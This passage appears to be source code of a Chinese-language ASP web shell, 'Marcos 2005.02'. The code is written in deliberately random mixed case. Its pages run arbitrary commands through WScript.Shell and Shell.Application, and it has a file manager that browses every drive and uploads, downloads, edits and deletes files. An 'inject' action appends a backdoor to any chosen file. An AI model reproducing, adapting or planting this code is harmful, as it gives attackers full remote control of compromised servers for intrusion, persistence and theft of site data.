           echo "<BR/><a href=javascript:showHideMe(sEssION);>sEsSIon:(id" & sESSiON.SessionId & ")</a>"
           eCho "<span id=sEsSioN style='display:none;'>"
           For EaCH strVariable In SEssIoN.Contents
               eChO "<li>" & strVariable & ": " & Encode(SeSsIOn(strVariable)) & "</li>"
           Next
           ecHo "</span>"

           eCho "<Br/><a href=javascript:showHideMe(Cookies);>Cookies:</a>"
           ecHO "<span ID=Cookies style='display:none;'>"
           For EAch strVariable In reQuEsT.Cookies
               If REQUeSt.Cookies(strVariable).HasKeys TheN
                   For eACH strKey In ReqUESt.Cookies(strVariable)
                       EchO "<li>" & strVariable & "(" & strKey & "): " & HtmlEncode(REQUeSt.Cookies(strVariable)(strKey)) & "</li>"
                   Next
                Else
                   EchO "<li>" & strVariable & ": " & Encode(Request.Cookies(strVariable)) & "</li>"
               EnD If
           Next
           Echo "</span><hr/>Powered By Marcos 2005.02"

       END Sub
       SUb PageWsCmdRun()
           DiM cmdStr, cmdPath, cmdResult
           cmdStr = reQUest("cmdStr")
           cmdPath = RequeST("cmdPath")

           sHOWTITlE("WScript.ShellÃüÁîÐÐ²Ù×÷")

           If cmdPath = "" THEN
               cmdPath = "cmd.exe"
           end If

           If cmdStr <> "" TheN
               If iNStR(LcASE(cmdPath), "cmd.exe") > 0 oR InsTr(lcAse(cmdPath), lcASe(myCmdDotExeFile)) > 0 ThEn
                   cmdResult = doWsCmdRun(cmdPath & " /c " & cmdStr)
                Else
                   If lcasE(cmdPath) = "wscriptshell" tHeN
                       cmdResult = doWsCmdRun(cmdStr)
                    Else
                       cmdResult = doWsCmdRun(cmdPath & " " & cmdStr)
                   end If
               eND If
           EnD If

           eCHo "<style>Body{margin:8;}</style>"
           eCHO "<Body onload=""document.forms[0].cmdStr.focus();document.forms[0].cmdResult.style.hEIGht=document.BODy.clientHeight-115;"">"
           ecHO "<FOrm MetHoD=pOsT ONsuBMIt='this.Submit.disabled=true'>"
           ecHO "Â·¾¶: <InpUT NaME=cmdPath TYpe=text id=cmdPath VaLue=""" & HtmlEncode(cmdPath) & """ size=50> "
           EcHo "<InpUT tyPe=BUTtOn NAME=Submit2 VAluE=Ê¹ÓÃWScript.Shell OnCliCk=""this.forM.cmdPath.VaLuE='WScriptShell';""><BR/>"
           EcHO "ÃüÁî/²ÎÊý: <iNpuT nAME=cmdStr tYpe=text id=cmdStr VaLUe=""" & HtmlEncode(cmdStr) & """ size=62> "
           EchO "<INPuT TYPE=submit nAME=Submit VaLUE=' ÔËÐÐ '><BR/>"
           EcHO "<hr/>×¢: ÇëÖ»ÔÚÕâÀïÖ´ÐÐµ¥²½³ÌÐò(³ÌÐòÖ´ÐÐ¿ªÊ¼µ½½áÊø²»ÐèÒªÈË¹¤¸ÉÔ¤),²»È»±¾³ÌÐò»áÎÞ·¨Õý³£¹¤×÷,²¢ÇÒÔÚ·þÎñÆ÷Éú³ÉÒ»¸ö²»¿É½áÊøµÄ½ø³Ì.<hr/>"
           eChO "<textarea Id=cmdResult style='Width:100%;hEigHT:78%;'>"
           EChO HtmlEncode(cmdResult)
           echO "</textarea>"
           eCHO "</ForM>"
           eCHo "</BODY>"
       End sub
       Function doWsCmdRun(cmdStr)
           If isDebugMode = False ThEn
               On Error Resume Next
           ENd If
           DiM fso, theFile
           Set fso = Server.cREAtEOBJeCt("Scripting.FileSystemObject")

           doWsCmdRun = wsX.Exec(cmdStr).StdOut.ReadAll()
           If Err tHeN
               echO Err.DesCription & "<bR>"
               Err.cLEAr
               wsX.Run cmdStr & " > " & aspPath, 0, True
               Set theFile = fso.OpenTextFile(aspPath)
               doWsCmdRun = theFile.RealAll()
               If Err thEn
                   eChO Err.DescRiPTION & "<bR>"
                   Err.CleAr
                   doWsCmdRun = streamLoadFromFile(aspPath)
               end If
           EnD If

           Set fso = Nothing
       EnD Function
       sUb PageSaCmdRun()
           If isDebugMode = False ThEn
               On Error Resume Next
           END If
           dim theFile, thePath, theAct, appPath, appName, appArgs

           ShOWTiTle("Shell.ApplicationÃüÁîÐÐ²Ù×÷")

           theAct = Trim(REqUEST("theAct"))
           appPath = Trim(requesT("appPath"))
           thePath = Trim(reQuEsT("thePath"))
           appName = Trim(RequEsT("appName"))
           appArgs = Trim(ReQUEst("appArgs"))
           If theAct = "doAct" tHen
               If appName = "" then
                   appName = "cmd.exe"
               eNd If

               If appPath <> "" and RIghT(appPath, 1) <> "\" theN
                   appPath = appPath & "\"
               EnD If

               If lCASe(appName) = "cmd.exe" AND appArgs <> "" thEn
                   If LcaSE(LEft(appArgs, 2)) <> "/c" ThEN
                       appArgs = "/c " & appArgs
                   end If
               Else
                   If lCASE(appName) = "cmd.exe" And appArgs = "" THen
                       appArgs = "/c "
                   end If
               eNd If

               saX.ShellExecute appName, appArgs, appPath, "", 0
               chkErr(Err)
           eND If

           If theAct = "readResult" Then
               Err.cLEaR
               EcHo encode(streamLoadFromFile(aspPath))
               If Err tHEN
                   Set theFile = fsoX.OpenTextFile(aspPath)
                   ECHO encode(theFile.ReadAll())
                   Set theFile = Nothing
               eND If
               ResPoNse.end
           EnD If

           eCHO "<style>BodY{margin:8;border:none;background-color:buttonface;}</style>"
           ECho "<BODY onload=""document.forms[0].appArgs.focus();setTimeout('wsLoadIFrame();', 3900);"">"
           ECho "<foRm mETHod=pOst OnsUBMit='this.Submit.disabled=true'>"
           ecHo "<iNput tYpe=HIDdEn namE=theAct vAlUE=doAct>"
           ecHO "<inPUT tYpE=hIddeN NAme=aspPath ValUe=""" & HtmlEncode(aspPath) & """>"
           Echo "ËùÔÚÂ·¾¶: <INPuT naME=appPath tYpE=text ID=appPath VAlue=""" & HtmlEncode(appPath) & """ size=62><Br/>"
           ecHo "³ÌÐòÎÄ¼þ: <InPut namE=appName TYPe=text Id=appName vaLue=""" & HtmlEncode(appName) & """ size=62> "
           EchO "<InPuT tyPe=bUTToN namE=Submit4 ValuE=' »ØÏÔ ' oNclIck=""this.FoRm.appArgs.vAlUE+=' > '+this.FOrM.aspPath.vaLUe;""><bR/> "
           eCHo "ÃüÁî²ÎÊý: <Input nAME=appArgs tyPe=text Id=appArgs vALuE=""" & HtmlEncode(appArgs) & """ size=62> "
           EcHo "<iNPUT tyPE=submit NAMe=Submit valUE=' ÔËÐÐ '><BR/>"
           ECho "<hr/>×¢: Ö»ÓÐÃüÁîÐÐ³ÌÐòÔÚCMD.EXEÔËÐÐ»·¾³ÏÂ²Å¿ÉÒÔ½øÐÐÁÙÊ±ÎÄ¼þ»ØÏÔ(ÀûÓÃ"">""·ûºÅ),ÆäËü³ÌÐòÖ»ÄÜÖ´ÐÐ²»ÄÜ»ØÏÔ.<bR/>"
           eCHO "¡¡&nbsp; ÓÉÓÚÃüÁîÖ´ÐÐÊ±¼äÍ¬ÍøÒ³Ë¢ÐÂÊ±¼ä²»Í¬²½,ËùÒÔÓÐÐ©Ö´ÐÐÊ±¼ä³¤µÄ³ÌÐò½á¹ûÐèÒªÊÖ¶¯Ë¢ÐÂÏÂÃæµÄiframe²ÅÄÜµÃµ½.»ØÏÔºó¼ÇµÃÉ¾³ýÁÙÊ±ÎÄ¼þ.<hr/>"
           echo "<iframe iD=cmdResult style='widTH:100%;HEighT:78%;'>"
           eCho "</iframe>"
           echo "</fOrm>"
           EchO "</bOdY>"
       enD SuB
       sub PageFsoFileExplorer()
           If isDebugMode = False tHen
               On Error Resume Next
           END If
           reSPOnSE.Buffer = True
           DiM file, drive, folder, theFiles, theFolder, theFolders
           DiM i, theAct, strTmp, driveStr, thePath, parentFolderName

           theAct = REQUESt("theAct")
           thePath = rEqUESt("thePath")
           If theAct <> "upload" THEn
               If reqUest.fOrm.Count > 0 thEN
                   theAct = rEQueSt.fORM("theAct")
                   thePath = REqUeSt.form("thePath")
               ENd If
           end If
           shoWTITLe("FSOÎÄ¼þä¯ÀÀÆ÷(&stream)")

           SElecT Case theAct
               Case "newOne", "doNewOne"
                   fsoNewOne(thePath)
               Case "showEdit"
                   Call showEdit(thePath, "fso")
               Case "saveFile"
                   Call saveToFile(thePath, "fso")
               Case "openUrl"
                   openUrl(thePath)
               Case "copyOne", "cutOne"
                   If thePath = "" TheN
                       alertThenClose("²ÎÊý´íÎó!")
                       ReSpONsE.ENd
                   enD If
                   sEssioN(m & "fsoThePath") = thePath
                   seSsIOn(m & "fsoTheAct") = theAct
                   alertThenClose("²Ù×÷³É¹¦,ÇëÕ³Ìù!")
               Case "pastOne"
                   fsoPastOne(thePath)
                   alertThenClose("Õ³Ìù³É¹¦,ÇëË¢ÐÂ±¾Ò³²é¿´Ð§¹û!")
               Case "showFsoRename"
                   showFsoRename(thePath)
               Case "doRename"
                   Call fsoRename(thePath)
                   alertThenClose("ÖØÃüÃû³É¹¦,Ë¢ÐÂºó¿ÉÒÔ¿´µ½Ð§¹û!")
               Case "delOne", "doDelOne"
                   showFsoDelOne(thePath)
               Case "getAttributes", "doModifyAttributes"
                   fsoTheAttributes(thePath)
               Case "DoWnTHEFIle"
                   DoWNTheFiLE(thePath)
               Case "showUpload"
                   Call showUpload(thePath, "FsoFileExplorer")
               Case "upload"
                   streamUpload(thePath)
                   Call showUpload(thePath, "FsoFileExplorer")
               Case "inject"
                   Set theFiles = fsoX.OpenTextFile(thePath)
                   strTmp = theFiles.ReadAll()
                   FsOsAVETofilE thePath, strTmp & strBackDoor
                   Set theFiles = Nothing
                   alertThenClose("ºóÃÅ²åÈë³É¹¦!")
           End seLECt

           If theAct <> "" thEN
               REspoNSe.enD
           eND If

           If ReqUeSt.FOrM.Count > 0 ThEN
               rEDIREctto("?pageName=FsoFileExplorer&thePath=" & UrlEncode(thePath))
           end If

           parentFolderName = fsoX.GetParentFolderName(thePath)

           eChO "<div style='Left:0px;wIdtH:100%;heIgHT:48px;position:absolute;top:2px;' ID=fileExplorerTools>"
           Echo "<INpUT TypE=button VAlUE=' ÐÂ½¨ ' OnClick=newOne();>"
           EcHO "<inPUt TyPE=bUtTON valuE=' ¸üÃû ' oncLick=fsoRename();>"
           eCho "<inPUt Type=BUTTON VAlUe=' ±à¼ ' ONclick=editFile();>"
           EcHo "<iNpuT TYPe=Button vaLue=' ´ò¿ª ' OnClICk=openUrl();>"
           echO "<inPUT tYPe=bUtton vaLue=' ¸´ÖÆ ' OnCliCK=appDoAction('copyOne');>"
           eChO "<inPuT TypE=bUTtON vALuE=' ¼ôÇÐ ' oNCLicK=appDoAction('cutOne');>"
           ecHO "<iNpUt tYPE=butTon VALue=' Õ³Ìù ' oncliCK=appDoAction2('pastOne')>"
           eCHO "<iNPUT type=bUTToN vALUE=' ÊôÐÔ ' onClicK=fsoGetAttributes();>"
           ecHo "<INput tYPe=BuTToN vAlue=' ²åÈë ' oNcliCK=appDoAction('inject');>"
           ecHO "<iNPut tYPE=bUtToN vaLue=' É¾³ý ' onClIck=delOne();>"
           ECho "<InpUt Type=BUTtON VaLUe=' ÉÏ´« ' oNclICk='upTheFile();'>"
           eChO "<inPuT TyPe=butTON valUe=' ÏÂÔØ ' onClIck='doWnTHEfIlE();'>"
           ecHO "<bR/>"
           eCHo "<iNput TYpe=HiDDen vAlUE=FsoFileExplorer NAmE=pageName />"
           ecHO "<iNPut TyPe=HiDden VALUe=""" & UrlEncode(thePath) & """ nAmE=truePath>"
           EchO "<INPUT Type=HIDden size=50 NAme=usePath>"
           EChO "<ForM mETHod=POST action=?pageName=FsoFileExplorer>"
           If parentFolderName <> "" ThEn
               ECho "<InpUT VAlUe='¡üÏòÉÏ' TyPE=butTON oNclICK=""this.disabled=true;location.href='?pageName=FsoFileExplorer&thePath=" & Server.UrlEncode(parentFolderName) & "';"">"
           ENd If
           EcHo "<InpUt TyPE=bUtTon vALuE=' ºóÍË ' OncLIck='this.disabled=true;history.BacK();' />"
           eCHo "<InPuT TYpe=buTTon VALuE=' Ç°½ø ' ONClICk='this.disabled=true;history.go(1);' />"
           EcHO "<iNput size=60 VAlUE=""" & HtmlEncode(thePath) & """ naMe=thePath>"
           EchO "<inPUt tYPe=submit VaLue=' ×ªµ½ '>"
           driveStr = "<OPTIon>ÅÌ·û</oPtioN>"
           driveStr = driveStr & "<opTiON vAlue='" & HtmlEncode(Server.MAPPATH(".")) & "'>.</opTioN>"
           driveStr = driveStr & "<opTioN vAlUe='" & HtmlEncode(Server.MAPpaTh("/")) & "'>/</optioN>"
           For EaCh drive In fsoX.Drives
               driveStr = driveStr & "<OPtIon valUE='" & drive.DriveLetter & ":\'>" & drive.DriveLetter & ":\</OptIoN>"
           Next
           eCHo "<iNPut TYpe=BUtton valUE=' Ë¢ÐÂ ' oNCLIcK='location.reload();'> "
           ECHO "<SeLeCt onchange=""this.fORm.thePath.vALue=this.valuE;this.FORm.submit();"">" & driveStr & "</seLECT>"
           ecHO "<hr/></form>"
           EcHo "</div><div style='HeiGht:50px;'></div>"
           ecHO "<script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"
           If fsoX.FolderExists(thePath) = False tHeN
               showErr(thePath & " Ä¿Â¼²»´æÔÚ»òÕß²»ÔÊÐí·ÃÎÊ!")
           EnD If
           Set theFolder = fsoX.GetFolder(thePath)
           Set theFiles = theFolder.Files
           Set theFolders = theFolder.SubFolders
           eCHO "<div id=FileList>"
           For EACh folder In theFolders
               i = i + 1
               If i > 50 TheN
                   i = 0
                   rESponSE.Flush()
               EnD If
               strTmp = UrlEncode(folder.Path & "\")
               eChO "<span id='" & strTmp & "' onDblClick=""changeThePath(this);"" onCliCK=changeMyClass(this);><font CLAsS=font face=Wingdings>0</font><br/>" & folder.NaME & "</span>" & vbNewLine
           Next
           rEspoNsE.Flush()
           For EACH file In theFiles
               i = i + 1
               If i > 100 theN
                   i = 0
                   rESpONSe.Flush()
               ENd If
               EcHo "<span iD='" & UrlEncode(file.Path) & "' titlE='ÀàÐÍ: " & file.tYpe & vbNewLine & "´óÐ¡: " & getTheSize(file.Size) & "' onDblClick=""openUrl();"" ONclIcK=changeMyClass(this);><font clasS=font face=" & getFileIcon(fsoX.GetExtensionName(file.nAmE)) & "</font><bR/>" & file.Name & "</span>" & vbNewLine
           Next
           eCHO "</div>"
           chkErr(Err)

           ecHo "<hr/>Powered By Marcos 2005.02"
       eND sub
       sUB fsoNewOne(thePath)
           If isDebugMode = False theN
               On Error Resume Next
           enD If
           dIM theAct, isFile, theName, newAct
           isFile = rEquesT("isFile")
           newAct = REQUesT("newAct")
           theName = reQUEst("theName")
           If newAct = " È·¶¨ " tHEN
               thePath = Replace(thePath & "\" & theName, "\\", "\")
               If isFile = "True" Then
                   Call fsoX.CreateTextFile(thePath, False)
                Else
                   fsoX.CreateFolder(thePath)
               END If
               chkErr(Err)
               alertThenClose("ÎÄ¼þ(¼Ð)ÐÂ½¨³É¹¦,Ë¢ÐÂºó¾Í¿ÉÒÔ¿´µ½Ð§¹û!")
               reSpOnse.end
           End If

           eCHO "<style>BOdy{overflow:HiDDeN;}</style>"
           ECHO "<boDY topmargin=2>"
           ECho "<form mEThOd=pOsT>"
           EchO "<inPUT TyPe=HidDen naME=thePath vAlUe=""" & HtmlEncode(thePath) & """><bR/>ÐÂ½¨: "
           eCHO "<inPut TYPE=radio NaME=isFile iD=file VaLuE='True' checked><label for=file>ÎÄ¼þ</label> "
           ECho "<InpuT TYPe=radio naME=isFile iD=folder valUE='False'><label for=folder>ÎÄ¼þ¼Ð</label><br/>"
           ecHO "<INpUT size=38 naMe=theName><hr/>"
           EchO "<inPUt tYPe=HiDdeN name=theAct VAluE=doNewOne>"
           ECho "<Input TyPE=submit Name=newAct value=' È·¶¨ '>" & strJsCloseMe
           ECHo "</foRm>"
           eCho "</bodY><BR/>"
       eNd sUB
       SUB fsoPastOne(thePath)
           If isDebugMode = False tHeN
               On Error Resume Next
           EnD If
           dIm sessionPath
           sessionPath = SESsIOn(m & "fsoThePath")

           If thePath = "" or sessionPath = "" tHEn
               alertThenClose("²ÎÊý´íÎó!")
               rESPoNse.ENd
           eNd If

           If RIghT(thePath, 1) = "\" TheN
               thePath = LEft(thePath, Len(thePath) - 1)
           eNd If

           If rIght(sessionPath, 1) = "\" THeN
               sessionPath = LefT(sessionPath, Len(sessionPath) - 1)
               If sEssion(m & "fsoTheAct") = "cutOne" thEn
                   Call fsoX.MoveFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
                Else
                   Call fsoX.CopyFolder(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
               eND If
            Else
               If SesSiOn(m & "fsoTheAct") = "cutOne" then
                   Call fsoX.MoveFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
                Else
                   Call fsoX.CopyFile(sessionPath, thePath & "\" & fsoX.GetFileName(sessionPath))
               ENd If
           ENd If

           chkErr(Err)
       EnD sUB
       suB fsoRename(thePath)
           If isDebugMode = False THEN
               On Error Resume Next
           enD If
           dim theFile, fileName, theFolder
           fileName = REQueST("fileName")

           If thePath = "" oR fileName = "" THEn
               alertThenClose("²ÎÊý´íÎó!")
               reSpONse.end
           eND If
           If RiGhT(thePath, 1) = "\" THeN
               Set theFolder = fsoX.GetFolder(thePath)
               theFolder.name = fileName
               Set theFolder = Nothing
            Else
               Set theFile = fsoX.GetFile(thePath)
               theFile.NAMe = fileName
               Set theFile = Nothing
           EnD If

           chkErr(Err)
       enD suB
       sub showFsoRename(thePath)
           dIM theAct, fileName
           fileName = fsoX.getFileName(thePath)

           echO "<style>bodY{overflow:hiDdEN;}</style>"
           eCho "<Body topmargin=2>"
           ECHO "<Form METhOd=Post>"
           EChO "<iNput type=HIDDeN NAMe=thePath ValUe=""" & HtmlEncode(thePath) & """><bR/>¸üÃûÎª:<BR/>"
           eChO "<InPUt size=38 nAmE=fileName VaLUe=""" & HtmlEncode(fileName) & """><hr/>"
           EchO "<INPUt tYPE=submit VALUe=' È·¶¨ '>"
           ecHO "<INpUt TYpE=HiddeN NAme=theAct vAlUe=doRename>"
           EcHO "<inpUt tyPe=BUTtON VAlue=' ¹Ø±Õ ' onclIck='window.close();'>"
           Echo "</FoRm>"
           EChO "</bODy><br/>"
       EnD SUB
       suB showFsoDelOne(thePath)
           If isDebugMode = False then
               On Error Resume Next
           eND If
           diM newAct, theFile
           newAct = rEQUeST("newAct")
           If newAct = "È·ÈÏÉ¾³ý?" THEN
               If riGHt(thePath, 1) = "\" tHen
                   thePath = LeFt(thePath, Len(thePath) - 1)
                   Call fsoX.DeleteFolder(thePath, True)
                Else
                   Call fsoX.DeleteFile(thePath, True)
               end If
               chkErr(Err)
               alertThenClose("ÎÄ¼þ(¼Ð)É¾³ý³É¹¦,Ë¢ÐÂºó¾Í¿ÉÒÔ¿´µ½Ð§¹û!")
               reSponSE.enD
           EnD If
           echo "<style>BodY{margin:8;border:none;overflow:hIDden;background-color:buttonface;}</style>"
           ECho "<form mEtHod=poST><bR/>"
           echO HtmlEncode(thePath)
           eCHO "<input Type=HIdDEn NAMe=thePath valUE=""" & HtmlEncode(thePath) & """>"
           echo "<INPuT TYPE=hIDdEN NamE=theAct VALUE=doDelOne>"
           eCHo "<hr/><InPUT Type=submit naME=newAct vaLUe='È·ÈÏÉ¾³ý?'><iNPut TyPe=BUTton value=' ¹Ø±Õ ' OnClick='window.close();'>"
           echO "</foRM>"
       eND sUB
       sub fsoTheAttributes(thePath)
           If isDebugMode = False then
               On Error Resume Next
           ENd If
           dIM newAct, theFile, theFolder, theTitle
           newAct = rEquesT("newAct")

           If Right(thePath, 1) = "\" tHeN
               Set theFolder = fsoX.GetFolder(thePath)
               If newAct = " ÐÞ¸Ä " then
                   setMyTitle(theFolder)
               END If
                   theTitle = getMyTitle(theFolder)
               Set theFolder = Nothing
            Else
               Set theFile = fsoX.GetFile(thePath)
               If newAct = " ÐÞ¸Ä " thEn
                   setMyTitle(theFile)
               eND If
               theTitle = getMyTitle(theFile)
               Set theFile = Nothing
           end If

           chkErr(Err)
           theTitle = Replace(theTitle, vbNewLine, "<br/>")
           eCHO "<style>Body{margin:8;overflow:hidDEN;}</style>"
           eCHO "<FOrm mEThoD=PosT>"
           EChO "<inPut tYPe=HiDdEN NaME=thePath vAluE=""" & HtmlEncode(thePath) & """>"
           echO "<INpUt TyPE=HidDeN nAMe=theAct ValuE=doModifyAttributes>"
           eCho theTitle
           EcHO "<hr/><iNPut TYpe=submit Name=newAct VAlUE=' ÐÞ¸Ä '>" & strJsCloseMe
           ECHo "</FoRM>"
       eND SUb
       Function getMyTitle(theOne)
           If isDebugMode = False THEn
               On Error Resume Next
           end If
           dIM strTitle
           strTitle = strTitle & "Â·¾¶: " & theOne.Path & "" & vbNewLine
           strTitle = strTitle & "´óÐ¡: " & getTheSize(theOne.Size) & vbNewLine
           strTitle = strTitle & "ÊôÐÔ: " & getAttributes(theOne.Attributes) & vbNewLine
           strTitle = strTitle & "´´½¨Ê±¼ä: " & theOne.DateCreated & vbNewLine
           strTitle = strTitle & "×îºóÐÞ¸Ä: " & theOne.DateLastModified & vbNewLine
           strTitle = strTitle & "×îºó·ÃÎÊ: " & theOne.DateLastAccessed
           getMyTitle = strTitle
       ENd Function
       SuB setMyTitle(theOne)
           dIm i, myAttributes

           For i = 1 To reQUEsT("attributes").Count
               myAttributes = myAttributes + CInt(REqUest("attributes")(i))
           Next
           theOne.Attributes = myAttributes

           chkErr(Err)
           ecHO  "<script>alert('¸ÃÎÄ¼þ(¼Ð)ÊôÐÔÒÑ°´ÕýÈ·ÉèÖÃÐÞ¸ÄÍê³É!');</script>"
       EnD SUb
       Function getAttributes(intValue)
           diM strAtt
           strAtt = "<inpuT type=checkbox NAmE=attributes VaLue=4 {$system}>ÏµÍ³ "
           strAtt = strAtt & "<INpUT tYPe=checkbox name=attributes vALUe=2 {$HiDDen}>Òþ²Ø "
           strAtt = strAtt & "<iNpUT tYpe=checkbox NamE=attributes valUE=1 {$readonly}>Ö»¶Á&nbsp;&nbsp;&nbsp;"
           strAtt = strAtt & "<INpUt TYPe=checkbox naME=attributes vALUe=32 {$archive}>´æµµ<br/>¡¡¡¡&nbsp; "
           strAtt = strAtt & "<inpuT TyPE=checkbox NAMe=attributes {$normal} ValUE=0>ÆÕÍ¨ "
           strAtt = strAtt & "<iNPUt tyPe=checkbox nAMe=attributes VAlue=128 {$compressed}>Ñ¹Ëõ "
           strAtt = strAtt & "<INPUT TYpe=checkbox NamE=attributes VALUE=16 {$directory}>ÎÄ¼þ¼Ð&nbsp;"
           strAtt = strAtt & "<Input TypE=checkbox NAMe=attributes valUe=64 {$alias}>¿ì½Ý·½Ê½"
   '       strAtt = strAtt & "<INPUt TyPe=checkbox nAMe=attributes ValuE=8 {$volume}>¾í±ê "
           If intValue = 0 tHen
               strAtt = Replace(strAtt, "{$normal}", "checked")
           EnD If
           If intValue >= 128 THEN
               intValue = intValue - 128
               strAtt = Replace(strAtt, "{$compressed}", "checked")
           end If
           If intValue >= 64 then
               intValue = intValue - 64
               strAtt = Replace(strAtt, "{$alias}", "checked")
           End If
           If intValue >= 32 THeN
               intValue = intValue - 32
               strAtt = Replace(strAtt, "{$archive}", "checked")
           end If
           If intValue >= 16 ThEN
               intValue = intValue - 16
               strAtt = Replace(strAtt, "{$directory}", "checked")
           ENd If
           If intValue >= 8 ThEn
               intValue = intValue - 8
               strAtt = Replace(strAtt, "{$volume}", "checked")
           enD If
           If intValue >= 4 THeN
               intValue = intValue - 4
               strAtt = Replace(strAtt, "{$system}", "checked")
           EnD If
           If intValue >= 2 THeN
               intValue = intValue - 2
               strAtt = Replace(strAtt, "{$hidden}", "checked")
           end If
           If intValue >= 1 TheN
               intValue = intValue - 1
               strAtt = Replace(strAtt, "{$readonly}", "checked")
           eND If
           getAttributes = strAtt
       end Function
       SuB showEdit(thePath, strMethod)
           If isDebugMode = False TheN
               On Error Resume Next
           ENd If
           DIm theFile, unEditableExt

           If rigHt(thePath, 1) = "\" tHEn
               alertThenClose("±à¼ÎÄ¼þ¼Ð²Ù×÷ÊÇ·Ç·¨µÄ.")
               reSpONsE.end
           END If

           unEditableExt = "$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"

           ECho "<style>bOdy{border:none;overflow:hiDdEN;background-color:buttonface;}</style>"
           eCho "<boDy topmargin=9>"
           eChO "<FoRM METhOd=pOsT style='margin:0;wiDth:100%;HEiGhT:100%;'>"
           eChO "<textarea nAME=fileContent style='WIDTh:100%;HEIght:90%;'>"
           If strMethod = "stream" THEN
               ecHO HtmlEncode(streamLoadFromFile(thePath))
            Else
               Set theFile = fsoX.OpenTextFile(thePath, 1)
               eCHO HtmlEncode(theFile.ReadAll())
               theFile.Close
               Set theFile = Nothing
           end If
           eCho "</textarea><hr/>"
           ECho "<div aLigN=riGHt>"
           echO "±£´æÎª:<inpUt size=30 NaMe=thePath VALUE=""" & HtmlEncode(thePath) & """> "
           Echo "<iNPUt TypE=checkbox nAmE='windowStatus' iD=windowStatus"
           If reQuESt.Cookies(m & "windowStatus") = "True" THEN
               Echo " checked"
           eNd If
           eCHO "><label for=windowStatus>±£´æºó¹Ø±Õ´°¿Ú</label> "
           ecHo "<INPUT TYPE=submit VAlue=' ±£´æ '><INpuT tyPe=hIddEn valUE='saveFile' nAme=theAct>"
           eCho "<INPUT tYpE=reset value=' »Ö¸´ '>"
           EChO "<InpuT tYpe=BUttoN valuE=' Çå¿Õ ' ONCLicK=this.FORm.fileContent.innerText='';>"
           echO strJsCloseMe & "</div>"
           eCHo "</form>"
           ECHo "</boDy><bR/>"

       end SuB
       SUB saveToFile(thePath, strMethod)
           If isDebugMode = False tHEn
               On Error Resume Next
           eNd If
           DIM fileContent, windowStatus
           fileContent = Request("fileContent")
           windowStatus = ReQuEST("windowStatus")

           If strMethod = "stream" tHEN
               streamSaveToFile thePath, fileContent
               chkErr(Err)
            Else
               FSoSavEtofIle thePath, fileContent
               chkErr(Err)
           EnD If

           If windowStatus = "on" TheN
               respoNSE.Cookies(m & "windowStatus") = "True"
               RESPonSE.wRitE "<script>window.close();</script>"
            Else
               REspoNSE.Cookies(m & "windowStatus") = "False"
               Call showEdit(thePath, strMethod)
           eNd If
       EnD suB
       sUB FsosAVetoFILe(thePath, fileContent)
           dIm theFile
           Set theFile = fsoX.OpenTextFile(thePath, 2, True)
           theFile.WriTE fileContent
           theFile.Close
           Set theFile = Nothing
       End sUb
       SUB openUrl(usePath)
           dIm theUrl, thePath

           thePath = Server.MaPpAtH("/")

           If lCaSE(left(usePath, Len(thePath))) = lcaSE(thePath) thEN
               theUrl = mID(usePath, Len(thePath) + 1)
               theUrl = Replace(theUrl, "\", "/")
               If LEft(theUrl, 1) = "/" thEn
                   theUrl = miD(theUrl, 2)
               eND If
               rESPoNsE.Redirect("/" & theUrl)
            Else
               alertThenClose("ÄúËùÒª´ò¿ªµÄÎÄ¼þ²»ÔÚ±¾Õ¾µãÄ¿Â¼ÏÂ\nÄú¿ÉÒÔ³¢ÊÔ°ÑÒª´ò¿ª(ÏÂÔØ)µÄÎÄ¼þÕ³Ìùµ½\nÕ¾µãÄ¿Â¼ÏÂ,È»ºóÔÙ´ò¿ª(ÏÂÔØ)!")
               RESPOnsE.ENd
           enD If
       ENd Sub
       sUB DowntHefILE(thePath)
           ReSpOnSe.ClEAR
           If isDebugMode = False THen
               On Error Resume Next
           enD If
           dIm stream, fileName, fileContentType
           fileName = SpLIT(thePath,"\")(uBOunD(spLIT(thePath,"\")))
           Set stream = Server.CrEATEoBJecT("ADodB.stream")
           stream.Open
           stream.type = 1
           stream.LoadFromFile(thePath)
           chkErr(Err)
           rEspONSE.AddHeader "Content-Disposition", "attachment; filename=" & fileName
           RESPoNsE.AddHeader "Content-Length", stream.Size
           RESPOnSE.Charset = "UTF-8"
           RESponsE.ContentType = "application/octet-stream"
           REspOnSE.BinaryWrite stream.Read
           REsPOnSE.Flush
           stream.Close
           Set stream = Nothing
       END sub
       SuB showUpload(thePath, pageName)
           eChO "<style>boDy{margin:8;overflow:hIDdEN;}</style>"
           eCho "<Form mEtHod=POsT EnCtYPe='multipart/FoRM-data' action='?pageName=" & pageName & "&theAct=upload&thePath=" & UrlEncode(thePath) & "' OnsUbmiT='this.Submit.disabled=true;;'>"
           ecHO "ÉÏ´«ÎÄ¼þ: <InPuT NaMe=file TYPE=file size=31><BR/>±£´æÎª: "
           eCHo "<InPUt naME=fileName TYpe=text vaLue=""" & HtmlEncode(thePath) & """ size=33>"
           Echo "<INpUt tyPE=checkbox NAME=writeMode Value=True>¸²¸ÇÄ£Ê½<hr/>"
           echo "<iNPUT NamE=Submit TYPe=submit id=Submit ValUE='ÉÏ ´«' oncLick=""this.fORm.action+='&fileName='+this.foRm.fileName.vALuE+'&theFile='+this.FOrM.file.VaLUE+'&overWrite='+this.fORm.writeMode.checked;"">"
           ecHo  strJsCloseMe
           eCHO "</FoRM>"
       eNd suB
       sub streamUpload(thePath)
           If isDebugMode = False thEn
               On Error Resume Next
           End If
           Server.ScriptTimeOut = 5000
           dIm i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
           theFile = reQuEsT("theFile")
           fileName = REQuest("fileName")
           overWrite = RequEST("overWrite")
           If INStr(fileName, ":") <= 0 tHEN
               fileName = thePath & fileName
           eND If
           Set stream = Server.cREATEOBJEct("ADODb.stream")
           Set streamT = Server.creaTeOBjECT("aDOdB.stream")
           With stream
               .tYpE = 1
               .Mode = 3
               .Open
               .WRiTe rEqUesT.binaRYReaD(ReQUesT.tOtaLbytEs)
               .Position = 0
               fileContent = .Read()
               i = InStrB(fileContent, chrB(13) & chrB(10))
               info = LeftB(fileContent, i - 1)
               i = Len(info) + 2
